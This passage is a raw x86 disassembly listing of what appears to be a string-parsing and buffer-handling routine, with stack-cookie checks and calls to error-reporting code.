  40e3ed:	cmp    dx,WORD PTR [ecx+0x2]
  40e3f1:	jne    0x40e402
  40e3f3:	add    eax,0x4
  40e3f6:	add    ecx,0x4
  40e3f9:	test   dx,dx
  40e3fc:	jne    0x40e3dc
  40e3fe:	xor    eax,eax
  40e400:	jmp    0x40e407
  40e402:	sbb    eax,eax
  40e404:	or     eax,0x1
  40e407:	test   eax,eax
  40e409:	mov    eax,DWORD PTR [ebp+0x10]
  40e40c:	jne    0x40e411
  40e40e:	mov    eax,DWORD PTR [ebp+0x14]
  40e411:	push   DWORD PTR [ebp+0x18]
  40e414:	mov    edx,DWORD PTR [ebp-0x224]
  40e41a:	mov    ecx,DWORD PTR [esi+0x4]
  40e41d:	push   eax
  40e41e:	mov    eax,DWORD PTR [ebp+0x10]
  40e421:	inc    eax
  40e422:	push   eax
  40e423:	lea    eax,[ebp-0x210]
  40e429:	push   eax
  40e42a:	lea    eax,[ebp-0x218]
  40e430:	push   eax
  40e431:	call   0x40dfe5
  40e436:	and    BYTE PTR [edi+0xc],0xfe
  40e43a:	mov    eax,DWORD PTR [ebp-0x218]
  40e440:	mov    DWORD PTR [ebp-0x21c],eax
  40e446:	xor    edi,edi
  40e448:	add    ebx,0x2
  40e44b:	cmp    WORD PTR [ebx],di
  40e44e:	je     0x40e498
  40e450:	mov    dl,BYTE PTR [ebp-0x211]
  40e456:	jmp    0x40e065
  40e45b:	xor    edi,edi
  40e45d:	jmp    0x40e133
  40e462:	mov    esi,DWORD PTR [ebp-0x220]
  40e468:	test   esi,esi
  40e46a:	je     0x40e46e
  40e46c:	mov    DWORD PTR [esi],eax
  40e46e:	xor    al,al
  40e470:	jmp    0x40e4a6
  40e472:	mov    esi,DWORD PTR [ebp-0x220]
  40e478:	test   esi,esi
  40e47a:	je     0x40e46e
  40e47c:	mov    eax,DWORD PTR [ebp-0x218]
  40e482:	jmp    0x40e46c
  40e484:	mov    ecx,DWORD PTR [ebp-0x220]
  40e48a:	test   ecx,ecx
  40e48c:	je     0x40e46e
  40e48e:	mov    eax,DWORD PTR [ebp-0x218]
  40e494:	mov    DWORD PTR [ecx],eax
  40e496:	jmp    0x40e46e
  40e498:	mov    esi,DWORD PTR [ebp-0x220]
  40e49e:	test   esi,esi
  40e4a0:	je     0x40e4a4
  40e4a2:	mov    DWORD PTR [esi],eax
  40e4a4:	mov    al,0x1
  40e4a6:	lea    esp,[ebp-0x23c]
  40e4ac:	pop    edi
  40e4ad:	pop    esi
  40e4ae:	pop    ebx
  40e4af:	mov    ecx,DWORD PTR [ebp-0x4]
  40e4b2:	xor    ecx,ebp
  40e4b4:	call   0x40fd0b
  40e4b9:	leave  
  40e4ba:	ret    0x14
  40e4bd:	push   ebx
  40e4be:	push   esi
  40e4bf:	push   edi
  40e4c0:	push   0x29
  40e4c2:	mov    esi,ecx
  40e4c4:	pop    ecx
  40e4c5:	mov    ebx,edx
  40e4c7:	push   0x5e
  40e4c9:	mov    edi,ebx
  40e4cb:	pop    edx
  40e4cc:	jmp    0x40e51a
  40e4ce:	cmp    ax,cx
  40e4d1:	je     0x40e55a
  40e4d7:	cmp    ax,0x3a
  40e4db:	je     0x40e522
  40e4dd:	cmp    ax,dx
  40e4e0:	jne    0x40e50e
  40e4e2:	add    esi,0x2
  40e4e5:	mov    cx,WORD PTR [esi]
  40e4e8:	call   0x40358a
  40e4ed:	test   al,al
  40e4ef:	jne    0x40e508
  40e4f1:	movzx  eax,WORD PTR [esi]
  40e4f4:	push   eax
  40e4f5:	push   0x3e9
  40e4fa:	push   DWORD PTR ds:0x4216e0
  40e500:	call   0x405021
  40e505:	add    esp,0xc
  40e508:	push   0x29
  40e50a:	pop    ecx
  40e50b:	push   0x5e
  40e50d:	pop    edx
  40e50e:	mov    ax,WORD PTR [esi]
  40e511:	mov    WORD PTR [edi],ax
  40e514:	add    edi,0x2
  40e517:	add    esi,0x2
  40e51a:	movzx  eax,WORD PTR [esi]
  40e51d:	test   ax,ax
  40e520:	jne    0x40e4ce
  40e522:	movzx  eax,WORD PTR [esi]
  40e525:	cmp    ax,cx
  40e528:	je     0x40e55a
  40e52a:	cmp    ax,dx
  40e52d:	jne    0x40e532
  40e52f:	add    esi,0x2
  40e532:	cmp    WORD PTR [esi],0x0
  40e536:	je     0x40e543
  40e538:	add    esi,0x2
  40e53b:	movzx  eax,WORD PTR [esi]
  40e53e:	cmp    ax,cx
  40e541:	jne    0x40e52a
  40e543:	cmp    WORD PTR [esi],cx
  40e546:	je     0x40e55a
  40e548:	push   0x3e8
  40e54d:	push   DWORD PTR ds:0x4216e0
  40e553:	call   0x405021
  40e558:	pop    ecx
  40e559:	pop    ecx
  40e55a:	xor    eax,eax
  40e55c:	mov    WORD PTR [edi],ax
  40e55f:	sub    edi,ebx
  40e561:	and    edi,0xfffffffe
  40e564:	cmp    edi,0x202
  40e56a:	jle    0x40e57e
  40e56c:	push   0x434
  40e571:	push   DWORD PTR ds:0x4216e0
  40e577:	call   0x405021
  40e57c:	pop    ecx
  40e57d:	pop    ecx
  40e57e:	pop    edi
  40e57f:	mov    eax,esi
  40e581:	pop    esi
  40e582:	pop    ebx
  40e583:	ret    
  40e584:	push   edi
  40e585:	mov    edi,ecx
  40e587:	cmp    WORD PTR [edi],0x0
  40e58b:	jne    0x40e591
  40e58d:	mov    eax,edi
  40e58f:	pop    edi
  40e590:	ret    
  40e591:	push   ebx
  40e592:	push   esi
  40e593:	lea    eax,[edi+0x2]
  40e596:	mov    esi,eax
  40e598:	push   0x5e
  40e59a:	movzx  ecx,WORD PTR [esi]
  40e59d:	pop    ebx
  40e59e:	cmp    cx,bx
  40e5a1:	je     0x40e60c
  40e5a3:	cmp    ecx,0x28
  40e5a6:	jne    0x40e60a
  40e5a8:	movzx  ecx,WORD PTR [esi+0x2]
  40e5ac:	cmp    cx,bx
  40e5af:	jne    0x40e5b6
  40e5b1:	lea    eax,[esi+0x2]
  40e5b4:	jmp    0x40e60c
  40e5b6:	cmp    ecx,0x40
  40e5b9:	jne    0x40e61d
  40e5bb:	movzx  eax,WORD PTR [esi+0x4]
  40e5bf:	cmp    ax,bx
  40e5c2:	jne    0x40e5ca
  40e5c4:	movzx  eax,WORD PTR [esi+0x6]
  40e5c8:	jmp    0x40e5f6
  40e5ca:	push   0x29
  40e5cc:	pop    ecx
  40e5cd:	cmp    ax,cx
  40e5d0:	jne    0x40e5d7
  40e5d2:	lea    eax,[esi+0x4]
  40e5d5:	jmp    0x40e60c
  40e5d7:	push   eax
  40e5d8:	push   0x40159c
  40e5dd:	call   DWORD PTR ds:0x437540
  40e5e3:	pop    ecx
  40e5e4:	pop    ecx
  40e5e5:	test   eax,eax
  40e5e7:	je     0x40e60a
  40e5e9:	movzx  eax,WORD PTR [esi+0x6]
  40e5ed:	cmp    ax,bx
  40e5f0:	jne    0x40e610
  40e5f2:	movzx  eax,WORD PTR [esi+0x8]
  40e5f6:	push   eax
  40e5f7:	push   0x3e9
  40e5fc:	push   DWORD PTR ds:0x4216e0
  40e602:	call   0x405021
  40e607:	add    esp,0xc
  40e60a:	mov    eax,edi
  40e60c:	pop    esi
  40e60d:	pop    ebx
  40e60e:	pop    edi
  40e60f:	ret    
  40e610:	push   0x29
  40e612:	pop    ecx
  40e613:	cmp    ax,cx
  40e616:	jne    0x40e60a
  40e618:	lea    eax,[esi+0x6]
  40e61b:	jmp    0x40e60c
  40e61d:	cmp    WORD PTR [eax],bx
  40e620:	je     0x40e60c
  40e622:	add    eax,0x2
  40e625:	jmp    0x40e60c
  40e627:	push   ebp
  40e628:	mov    ebp,esp
  40e62a:	push   ecx
  40e62b:	push   esi
  40e62c:	push   edi
  40e62d:	mov    esi,ecx
  40e62f:	push   0x24
  40e631:	xor    edi,edi
  40e633:	push   esi
  40e634:	mov    DWORD PTR [ebp-0x4],edi
  40e637:	call   DWORD PTR ds:0x437540
  40e63d:	pop    ecx
  40e63e:	pop    ecx
  40e63f:	test   eax,eax
  40e641:	je     0x40e689
  40e643:	push   edi
  40e644:	push   edi
  40e645:	push   edi
  40e646:	push   edi
  40e647:	push   edi
  40e648:	lea    edx,[ebp-0x4]
  40e64b:	mov    ecx,esi
  40e64d:	call   0x40dfe5
  40e652:	mov    edi,DWORD PTR [ebp-0x4]
  40e655:	lea    eax,[ebp-0x4]
  40e658:	push   eax
  40e659:	or     dl,0xff
  40e65c:	mov    ecx,esi
  40e65e:	call   0x40e68f
  40e663:	mov    esi,eax
  40e665:	mov    eax,edi
  40e667:	mov    DWORD PTR [ebp-0x4],eax
  40e66a:	test   edi,edi
  40e66c:	je     0x40e689
  40e66e:	mov    ecx,DWORD PTR ds:0x43265c
  40e674:	mov    edi,DWORD PTR [edi]
  40e676:	mov    DWORD PTR [eax],ecx
  40e678:	mov    ecx,eax
  40e67a:	mov    eax,edi
  40e67c:	mov    DWORD PTR [ebp-0x4],eax
  40e67f:	test   edi,edi
  40e681:	jne    0x40e674
  40e683:	mov    DWORD PTR ds:0x43265c,ecx
  40e689:	pop    edi
  40e68a:	mov    eax,esi
  40e68c:	pop    esi
  40e68d:	leave  
  40e68e:	ret    
  40e68f:	push   ebp
  40e690:	mov    ebp,esp
  40e692:	and    esp,0xfffffff8
  40e695:	sub    esp,0x834
  40e69b:	mov    eax,ds:0x411018
  40e6a0:	xor    eax,esp
  40e6a2:	mov    DWORD PTR [esp+0x830],eax
  40e6a9:	mov    eax,DWORD PTR [ebp+0x8]
  40e6ac:	push   ebx
  40e6ad:	mov    DWORD PTR [esp+0x28],eax
  40e6b1:	xor    eax,eax
  40e6b3:	mov    ebx,ecx
  40e6b5:	mov    cl,al
  40e6b7:	push   esi
  40e6b8:	mov    BYTE PTR [esp+0x13],al
  40e6bc:	lea    eax,[esp+0x834]
  40e6c3:	push   edi
  40e6c4:	mov    DWORD PTR [esp+0x18],eax
  40e6c8:	movzx  eax,WORD PTR [ebx]
  40e6cb:	lea    edi,[esp+0x38]
  40e6cf:	mov    esi,edi
  40e6d1:	push   0x2
  40e6d3:	mov    BYTE PTR [esp+0x2b],dl
  40e6d7:	mov    DWORD PTR [esp+0x2c],ebx
  40e6db:	mov    BYTE PTR [esp+0x13],cl
  40e6df:	mov    DWORD PTR [esp+0x24],0x400
  40e6e7:	mov    DWORD PTR [esp+0x20],edi
  40e6eb:	mov    DWORD PTR [esp+0x14],esi
  40e6ef:	pop    edx
  40e6f0:	test   ax,ax
  40e6f3:	je     0x40e9af
  40e6f9:	mov    edi,DWORD PTR ds:0x437540
  40e6ff:	mov    DWORD PTR [esp+0x34],0x24
  40e707:	mov    DWORD PTR [esp+0x2c],0x22
  40e70f:	test   ax,ax
  40e712:	je     0x40e7d8
  40e718:	push   0x5e
  40e71a:	pop    edi
  40e71b:	cmp    ax,WORD PTR [esp+0x34]
  40e720:	je     0x40e7d2
  40e726:	cmp    esi,DWORD PTR [esp+0x18]
  40e72a:	jne    0x40e753
  40e72c:	lea    eax,[esp+0x38]
  40e730:	push   eax
  40e731:	lea    eax,[esp+0x24]
  40e735:	push   eax
  40e736:	lea    eax,[esp+0x20]
  40e73a:	push   eax
  40e73b:	lea    edx,[esp+0x1c]
  40e73f:	lea    ecx,[esp+0x28]
  40e743:	call   0x40ea0b
  40e748:	mov    esi,DWORD PTR [esp+0x10]
  40e74c:	mov    cl,BYTE PTR [esp+0xf]
  40e750:	push   0x2
  40e752:	pop    edx
  40e753:	movzx  eax,WORD PTR [ebx]
  40e756:	cmp    ax,WORD PTR [esp+0x2c]
  40e75b:	jne    0x40e766
  40e75d:	test   cl,cl
  40e75f:	sete   cl
  40e762:	mov    BYTE PTR [esp+0xf],cl
  40e766:	test   cl,cl
  40e768:	jne    0x40e7b7
  40e76a:	cmp    ax,di
  40e76d:	jne    0x40e7b7
  40e76f:	mov    WORD PTR [esi],di
  40e772:	add    esi,edx
  40e774:	mov    DWORD PTR [esp+0x10],esi
  40e778:	cmp    esi,DWORD PTR [esp+0x18]
  40e77c:	jne    0x40e7a5
  40e77e:	lea    eax,[esp+0x38]
  40e782:	push   eax
  40e783:	lea    eax,[esp+0x24]
  40e787:	push   eax
  40e788:	lea    eax,[esp+0x20]
  40e78c:	push   eax
  40e78d:	lea    edx,[esp+0x1c]
  40e791:	lea    ecx,[esp+0x28]
  40e795:	call   0x40ea0b
  40e79a:	mov    esi,DWORD PTR [esp+0x10]
  40e79e:	mov    cl,BYTE PTR [esp+0xf]
  40e7a2:	push   0x2
  40e7a4:	pop    edx
  40e7a5:	add    ebx,edx
  40e7a7:	movzx  eax,WORD PTR [ebx]
  40e7aa:	cmp    ax,WORD PTR [esp+0x2c]
  40e7af:	jne    0x40e7b7
  40e7b1:	mov    cl,0x1
  40e7b3:	mov    BYTE PTR [esp+0xf],cl
  40e7b7:	add    ebx,edx
  40e7b9:	mov    WORD PTR [esi],ax
  40e7bc:	movzx  eax,WORD PTR [ebx]
  40e7bf:	add    esi,edx
  40e7c1:	mov    DWORD PTR [esp+0x10],esi
  40e7c5:	mov    DWORD PTR [esp+0x28],ebx
  40e7c9:	test   ax,ax
  40e7cc:	jne    0x40e71b
  40e7d2:	mov    edi,DWORD PTR ds:0x437540
  40e7d8:	cmp    esi,DWORD PTR [esp+0x18]
  40e7dc:	jne    0x40e7fe
  40e7de:	lea    eax,[esp+0x38]
  40e7e2:	push   eax
  40e7e3:	lea    eax,[esp+0x24]
  40e7e7:	push   eax
  40e7e8:	lea    eax,[esp+0x20]
  40e7ec:	push   eax
  40e7ed:	lea    edx,[esp+0x1c]
  40e7f1:	lea    ecx,[esp+0x28]
  40e7f5:	call   0x40ea0b
  40e7fa:	mov    esi,DWORD PTR [esp+0x10]
  40e7fe:	xor    eax,eax
  40e800:	cmp    WORD PTR [ebx],ax
  40e803:	je     0x40e982
  40e809:	push   0x28
  40e80b:	lea    esi,[ebx+0x2]
  40e80e:	pop    eax
  40e80f:	cmp    WORD PTR [esi],ax
  40e812:	jne    0x40e84e
  40e814:	movzx  eax,WORD PTR [esi+0x2]
  40e818:	push   eax
  40e819:	push   0x4015a8
  40e81e:	call   edi
  40e820:	pop    ecx
  40e821:	pop    ecx
  40e822:	test   eax,eax
  40e824:	je     0x40e84e
  40e826:	lea    eax,[esp+0x38]
  40e82a:	push   eax
  40e82b:	push   0x3
  40e82d:	lea    eax,[esp+0x28]
  40e831:	push   eax
  40e832:	lea    eax,[esp+0x24]
  40e836:	push   eax
  40e837:	lea    eax,[esp+0x20]
  40e83b:	push   eax
  40e83c:	lea    edx,[esp+0x3c]
  40e840:	lea    ecx,[esp+0x30]
  40e844:	call   0x40ea79
  40e849:	jmp    0x40e966
  40e84e:	mov    ax,WORD PTR [esi]
  40e851:	push   0x2
  40e853:	pop    ecx
  40e854:	push   0x24
  40e856:	pop    edx
  40e857:	add    esi,ecx
  40e859:	cmp    ax,dx
  40e85c:	jne    0x40e8bf
  40e85e:	movzx  eax,WORD PTR [esi]
  40e861:	push   0x5e
  40e863:	pop    edx
  40e864:	cmp    ax,dx
  40e867:	je     0x40e8b3
  40e869:	cmp    BYTE PTR [esp+0x27],0x1
  40e86e:	jne    0x40e8b3
  40e870:	cmp    eax,0x40
  40e873:	jne    0x40e87d
  40e875:	lea    eax,[esp+0x38]
  40e879:	push   eax
  40e87a:	push   ecx
  40e87b:	jmp    0x40e82d
  40e87d:	push   0x28
  40e87f:	pop    edx
  40e880:	cmp    ax,dx
  40e883:	jne    0x40e887
  40e885:	add    esi,ecx
  40e887:	add    esi,ecx
  40e889:	movzx  eax,WORD PTR [esi]
  40e88c:	cmp    eax,0x46
  40e88f:	je     0x40e8a0
  40e891:	cmp    eax,0x44
  40e894:	je     0x40e8a0
  40e896:	cmp    eax,0x42
  40e899:	je     0x40e8a0
  40e89b:	cmp    eax,0x52
  40e89e:	jne    0x40e8b3
  40e8a0:	cmp    WORD PTR [esi+ecx*1],0x29
  40e8a5:	jne    0x40e8b3
  40e8a7:	lea    eax,[esp+0x38]
  40e8ab:	push   eax
  40e8ac:	push   0x4
  40e8ae:	jmp    0x40e82d
  40e8b3:	lea    eax,[esp+0x38]
  40e8b7:	push   eax
  40e8b8:	push   0x5
  40e8ba:	jmp    0x40e82d
  40e8bf:	movzx  eax,WORD PTR [ebx+0x2]
  40e8c3:	push   eax
  40e8c4:	push   0x4015a8
  40e8c9:	call   edi
  40e8cb:	pop    ecx
  40e8cc:	pop    ecx
  40e8cd:	test   eax,eax
  40e8cf:	je     0x40e8dd
  40e8d1:	lea    eax,[esp+0x38]
  40e8d5:	push   eax
  40e8d6:	push   0x1
  40e8d8:	jmp    0x40e82d
  40e8dd:	mov    ebx,DWORD PTR [esp+0x30]
  40e8e1:	xor    eax,eax
  40e8e3:	cmp    DWORD PTR [ebx],eax
  40e8e5:	jne    0x40e8f9
  40e8e7:	push   0x410
  40e8ec:	push   DWORD PTR ds:0x4216e0
  40e8f2:	call   0x405021
  40e8f7:	pop    ecx
  40e8f8:	pop    ecx
  40e8f9:	mov    eax,DWORD PTR [ebx]
  40e8fb:	push   0x24
  40e8fd:	pop    ecx
  40e8fe:	push   ecx
  40e8ff:	push   DWORD PTR [eax+0x4]
  40e902:	call   edi
  40e904:	pop    ecx
  40e905:	pop    ecx
  40e906:	test   eax,eax
  40e908:	je     0x40e926
  40e90a:	mov    ecx,DWORD PTR [ebx]
  40e90c:	mov    dl,BYTE PTR [esp+0x27]
  40e910:	mov    eax,DWORD PTR [ecx]
  40e912:	mov    DWORD PTR [ebx],eax
  40e914:	mov    ecx,DWORD PTR [ecx+0x4]
  40e917:	push   ebx
  40e918:	call   0x40e68f
  40e91d:	mov    esi,eax
  40e91f:	mov    BYTE PTR [esp+0x17],0x1
  40e924:	jmp    0x40e92f
  40e926:	mov    eax,DWORD PTR [ebx]
  40e928:	mov    esi,DWORD PTR [eax+0x4]
  40e92b:	mov    eax,DWORD PTR [eax]
  40e92d:	mov    DWORD PTR [ebx],eax
  40e92f:	lea    eax,[esp+0x38]
  40e933:	push   eax
  40e934:	lea    eax,[esp+0x24]
  40e938:	push   eax
  40e939:	push   esi
  40e93a:	lea    eax,[esp+0x24]
  40e93e:	push   eax
  40e93f:	lea    eax,[esp+0x20]
  40e943:	push   eax
  40e944:	lea    edx,[esp+0x3c]
  40e948:	lea    ecx,[esp+0x30]
  40e94c:	call   0x40ef0b
  40e951:	cmp    BYTE PTR [esp+0x17],0x0
  40e956:	je     0x40e966
  40e958:	push   esi
  40e959:	call   DWORD PTR ds:0x43754c
  40e95f:	xor    eax,eax
  40e961:	pop    ecx
  40e962:	mov    BYTE PTR [esp+0x17],al
  40e966:	mov    ebx,DWORD PTR [esp+0x28]
  40e96a:	mov    esi,DWORD PTR [esp+0x10]
  40e96e:	movzx  eax,WORD PTR [ebx]
  40e971:	test   ax,ax
  40e974:	je     0x40e982
  40e976:	mov    cl,BYTE PTR [esp+0xf]
  40e97a:	push   0x2
  40e97c:	pop    edx
  40e97d:	jmp    0x40e70f
  40e982:	cmp    esi,DWORD PTR [esp+0x18]
  40e986:	jne    0x40e9a8
  40e988:	lea    eax,[esp+0x38]
  40e98c:	push   eax
  40e98d:	lea    eax,[esp+0x24]
  40e991:	push   eax
  40e992:	lea    eax,[esp+0x20]
  40e996:	push   eax
  40e997:	lea    edx,[esp+0x1c]
  40e99b:	lea    ecx,[esp+0x28]
  40e99f:	call   0x40ea0b
  40e9a4:	mov    esi,DWORD PTR [esp+0x10]
  40e9a8:	mov    edi,DWORD PTR [esp+0x1c]
  40e9ac:	push   0x2
  40e9ae:	pop    edx
  40e9af:	xor    eax,eax
  40e9b1:	mov    WORD PTR [esi],ax
  40e9b4:	add    esi,edx
  40e9b6:	sub    esi,edi
  40e9b8:	sar    esi,1
  40e9ba:	xor    ecx,ecx
  40e9bc:	mov    eax,esi
  40e9be:	mul    edx
  40e9c0:	seto   cl
  40e9c3:	neg    ecx
  40e9c5:	or     ecx,eax
  40e9c7:	call   0x40a2fb
  40e9cc:	mov    ebx,eax
  40e9ce:	test   ebx,ebx
  40e9d0:	jne    0x40e9e4
  40e9d2:	push   0x419
  40e9d7:	push   DWORD PTR ds:0x4216e0
  40e9dd:	call   0x405021
  40e9e2:	pop    ecx
  40e9e3:	pop    ecx
  40e9e4:	lea    eax,[esi+esi*1]
  40e9e7:	push   eax
  40e9e8:	push   edi
  40e9e9:	push   ebx
  40e9ea:	call   0x41047c
  40e9ef:	mov    ecx,DWORD PTR [esp+0x848]
  40e9f6:	add    esp,0xc
  40e9f9:	mov    eax,ebx
  40e9fb:	pop    edi
  40e9fc:	pop    esi
  40e9fd:	pop    ebx
  40e9fe:	xor    ecx,esp
  40ea00:	call   0x40fd0b
  40ea05:	mov    esp,ebp
  40ea07:	pop    ebp
  40ea08:	ret    0x4
  40ea0b:	push   ebp
  40ea0c:	mov    ebp,esp
  40ea0e:	push   ecx
  40ea0f:	push   ecx
  40ea10:	push   ebx
  40ea11:	mov    ebx,DWORD PTR [ebp+0xc]
  40ea14:	push   esi
  40ea15:	push   edi
  40ea16:	mov    edi,ecx
  40ea18:	mov    DWORD PTR [ebp-0x4],edx
  40ea1b:	mov    eax,DWORD PTR [edi]
  40ea1d:	cmp    eax,DWORD PTR [ebp+0x10]
  40ea20:	jne    0x40ea4b
  40ea22:	mov    eax,DWORD PTR [ebx]
  40ea24:	xor    ecx,ecx
  40ea26:	push   0x2
  40ea28:	pop    edx
  40ea29:	mul    edx
  40ea2b:	seto   cl
  40ea2e:	neg    ecx
  40ea30:	or     ecx,eax
  40ea32:	call   0x40a2fb
  40ea37:	mov    ecx,DWORD PTR [ebx]
  40ea39:	add    ecx,ecx
  40ea3b:	push   ecx
  40ea3c:	push   DWORD PTR [edi]
  40ea3e:	mov    esi,eax
  40ea40:	push   esi
  40ea41:	call   0x41047c
  40ea46:	add    esp,0xc
  40ea49:	mov    DWORD PTR [edi],esi
  40ea4b:	mov    esi,DWORD PTR [ebx]
  40ea4d:	mov    ecx,DWORD PTR [edi]
  40ea4f:	add    esi,0x400
  40ea55:	mov    edx,esi
  40ea57:	call   0x40f994
  40ea5c:	mov    ecx,DWORD PTR [ebx]
  40ea5e:	mov    edx,DWORD PTR [ebp-0x4]
  40ea61:	lea    ecx,[eax+ecx*2]
  40ea64:	mov    DWORD PTR [edi],eax
  40ea66:	mov    DWORD PTR [edx],ecx
  40ea68:	lea    ecx,[eax+esi*2]
  40ea6b:	mov    eax,DWORD PTR [ebp+0x8]
  40ea6e:	pop    edi
  40ea6f:	mov    DWORD PTR [ebx],esi
  40ea71:	pop    esi
  40ea72:	mov    DWORD PTR [eax],ecx
  40ea74:	pop    ebx
  40ea75:	leave  
  40ea76:	ret    0xc
  40ea79:	push   ebp
  40ea7a:	mov    ebp,esp
  40ea7c:	sub    esp,0x38
  40ea7f:	xor    eax,eax
  40ea81:	push   ebx
  40ea82:	push   esi
  40ea83:	push   edi
  40ea84:	mov    edi,ecx
  40ea86:	mov    DWORD PTR [ebp-0x2c],eax
  40ea89:	mov    esi,eax
  40ea8b:	mov    DWORD PTR [ebp-0x24],eax
  40ea8e:	mov    bl,al
  40ea90:	mov    BYTE PTR [ebp-0x1],al
  40ea93:	mov    BYTE PTR [ebp-0x2],al
  40ea96:	xor    ecx,ecx
  40ea98:	mov    DWORD PTR [ebp-0x18],eax
  40ea9b:	mov    DWORD PTR [ebp-0x20],eax
  40ea9e:	mov    eax,DWORD PTR [ebp+0x14]
  40eaa1:	inc    ecx
  40eaa2:	mov    DWORD PTR [ebp-0x10],edx
  40eaa5:	mov    DWORD PTR [ebp-0x34],edi
  40eaa8:	mov    DWORD PTR [ebp-0x1c],ecx
  40eaab:	mov    DWORD PTR [ebp-0x8],0x2
  40eab2:	dec    eax
  40eab3:	je     0x40eb13
  40eab5:	dec    eax
  40eab6:	je     0x40eb04
  40eab8:	dec    eax
  40eab9:	je     0x40eb0c
  40eabb:	dec    eax
  40eabc:	je     0x40eaf9
  40eabe:	dec    eax
  40eabf:	jne    0x40edac
  40eac5:	mov    esi,DWORD PTR [ebp+0x8]
  40eac8:	mov    ecx,DWORD PTR [ebp+0xc]
  40eacb:	mov    eax,DWORD PTR [esi]
  40eacd:	cmp    eax,DWORD PTR [ecx]
  40eacf:	jne    0x40eae4
  40ead1:	push   DWORD PTR [ebp+0x18]
  40ead4:	mov    edx,esi
  40ead6:	push   DWORD PTR [ebp+0x10]
  40ead9:	push   ecx
  40eada:	mov    ecx,edi
  40eadc:	call   0x40ea0b
  40eae1:	mov    edx,DWORD PTR [ebp-0x10]
  40eae4:	mov    eax,DWORD PTR [esi]
  40eae6:	push   0x24
  40eae8:	pop    ecx
  40eae9:	mov    WORD PTR [eax],cx
  40eaec:	add    eax,0x2
  40eaef:	add    DWORD PTR [edx],0x4
  40eaf2:	mov    DWORD PTR [esi],eax
  40eaf4:	jmp    0x40edac
  40eaf9:	mov    DWORD PTR [ebp-0x1c],0x4
  40eb00:	mov    BYTE PTR [ebp-0x1],0x1
  40eb04:	mov    esi,DWORD PTR ds:0x421ef8
  40eb0a:	jmp    0x40eb68
  40eb0c:	mov    ecx,DWORD PTR [ebp-0x8]
  40eb0f:	mov    BYTE PTR [ebp-0x1],0x1
  40eb13:	mov    edx,DWORD PTR [edx]
  40eb15:	push   0x2a
  40eb17:	movzx  eax,WORD PTR [edx+ecx*2]
  40eb1b:	pop    edi
  40eb1c:	sub    eax,edi
  40eb1e:	je     0x40eb45
  40eb20:	sub    eax,0x12
  40eb23:	je     0x40eb3d
  40eb25:	sub    eax,0x3
  40eb28:	je     0x40eb35
  40eb2a:	dec    eax
  40eb2b:	jne    0x40eb61
  40eb2d:	mov    esi,DWORD PTR ds:0x421f04
  40eb33:	jmp    0x40eb61
  40eb35:	mov    esi,DWORD PTR ds:0x421f00
  40eb3b:	jmp    0x40eb5f
  40eb3d:	mov    esi,DWORD PTR ds:0x421efc
  40eb43:	jmp    0x40eb61
  40eb45:	cmp    WORD PTR [edx+ecx*2+0x2],di
  40eb4a:	je     0x40eb58
  40eb4c:	mov    esi,DWORD PTR ds:0x421f08
  40eb52:	mov    BYTE PTR [ebp-0x2],0x1
  40eb56:	jmp    0x40eb61
  40eb58:	mov    esi,DWORD PTR ds:0x421ef4
  40eb5e:	inc    ecx
  40eb5f:	mov    bl,0x1
  40eb61:	mov    edx,DWORD PTR [ebp-0x10]
  40eb64:	inc    ecx
  40eb65:	mov    DWORD PTR [ebp-0x1c],ecx
  40eb68:	push   0x20
  40eb6a:	pop    ecx
  40eb6b:	test   esi,esi
  40eb6d:	jne    0x40ebc1
  40eb6f:	mov    edi,DWORD PTR [edx]
  40eb71:	xor    ebx,ebx
  40eb73:	cmp    WORD PTR [edi],bx
  40eb76:	je     0x40eb92
  40eb78:	mov    edx,DWORD PTR [ebp-0x8]
  40eb7b:	movzx  eax,WORD PTR [edi]
  40eb7e:	cmp    ax,cx
  40eb81:	je     0x40eb8f
  40eb83:	cmp    eax,0x9
  40eb86:	je     0x40eb8f
  40eb88:	add    edi,edx
  40eb8a:	cmp    WORD PTR [edi],bx
  40eb8d:	jne    0x40eb7b
  40eb8f:	mov    edx,DWORD PTR [ebp-0x10]
  40eb92:	movzx  esi,WORD PTR [edi]
  40eb95:	xor    eax,eax
  40eb97:	mov    WORD PTR [edi],ax
  40eb9a:	push   DWORD PTR [edx]
  40eb9c:	push   0xfa6
  40eba1:	push   DWORD PTR ds:0x4216e0
  40eba7:	call   0x405021
  40ebac:	add    esp,0xc
  40ebaf:	mov    ecx,0x401668
  40ebb4:	mov    WORD PTR [edi],si
  40ebb7:	call   0x40dd18
  40ebbc:	mov    esi,eax
  40ebbe:	mov    DWORD PTR [ebp-0x24],esi
  40ebc1:	test   bl,bl
  40ebc3:	je     0x40ed10
  40ebc9:	mov    edi,esi
  40ebcb:	mov    ecx,0x800
  40ebd0:	mov    DWORD PTR [ebp-0x24],0x400
  40ebd7:	mov    DWORD PTR [ebp-0x28],edi
  40ebda:	call   0x40a2fb
  40ebdf:	mov    esi,eax
  40ebe1:	mov    DWORD PTR [ebp-0x14],esi
  40ebe4:	lea    ebx,[esi+0x800]
  40ebea:	mov    DWORD PTR [ebp-0xc],ebx
  40ebed:	mov    DWORD PTR [ebp+0x14],esi
  40ebf0:	test   edi,edi
  40ebf2:	je     0x40ed08
  40ebf8:	cmp    BYTE PTR [ebp-0x1],0x0
  40ebfc:	mov    edi,DWORD PTR [edi+0x4]
  40ebff:	je     0x40ec65
  40ec01:	mov    ecx,edi
  40ec03:	lea    edx,[ecx+0x2]
  40ec06:	mov    ax,WORD PTR [ecx]
  40ec09:	add    ecx,0x2
  40ec0c:	cmp    ax,WORD PTR [ebp-0x2c]
  40ec10:	jne    0x40ec06
  40ec12:	mov    eax,DWORD PTR [ebp-0x18]
  40ec15:	sub    ecx,edx
  40ec17:	sar    ecx,1
  40ec19:	lea    edx,[ecx+0x1]
  40ec1c:	mov    DWORD PTR [ebp-0x30],edx
  40ec1f:	cmp    edx,DWORD PTR [ebp-0x20]
  40ec22:	jbe    0x40ec4c
  40ec24:	test   eax,eax
  40ec26:	je     0x40ec33
  40ec28:	push   eax
  40ec29:	call   DWORD PTR ds:0x43754c
  40ec2f:	mov    edx,DWORD PTR [ebp-0x30]
  40ec32:	pop    ecx
  40ec33:	xor    ecx,ecx
  40ec35:	mov    eax,edx
  40ec37:	mov    DWORD PTR [ebp-0x20],edx
  40ec3a:	mul    DWORD PTR [ebp-0x8]
  40ec3d:	seto   cl
  40ec40:	neg    ecx
  40ec42:	or     ecx,eax
  40ec44:	call   0x40a2fb
  40ec49:	mov    DWORD PTR [ebp-0x18],eax
  40ec4c:	mov    ecx,DWORD PTR [ebp-0x10]
  40ec4f:	mov    edx,eax
  40ec51:	mov    ecx,DWORD PTR [ecx]
